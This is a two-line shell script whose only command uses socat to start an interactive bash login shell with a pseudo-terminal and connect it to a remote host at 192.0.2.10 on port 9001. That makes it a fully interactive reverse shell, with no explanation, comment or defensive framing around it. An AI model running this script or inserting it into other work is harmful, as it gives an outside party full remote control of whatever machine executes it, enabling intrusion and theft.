#!/bin/sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.0.2.10:9001
